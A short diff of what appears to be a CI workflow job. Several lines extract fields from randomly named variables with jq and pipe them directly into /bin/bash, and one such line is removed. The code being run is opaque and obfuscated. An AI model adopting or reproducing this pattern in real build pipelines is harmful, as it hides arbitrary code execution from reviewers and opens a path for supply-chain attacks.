@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$rj1709" | jq -r .kc33 | /bin/bash
           echo $smdyx5 | jq -r .igj8 | /bin/bash
           echo $z51 | jq -r .zvxqc7 | /bin/bash
-          echo $rrgt85 | jq -r .jx5251 | /bin/bash
           printf '%s' "$fky250" | jq -r .kpk626 | /bin/bash
 
       - name: Upload artifact
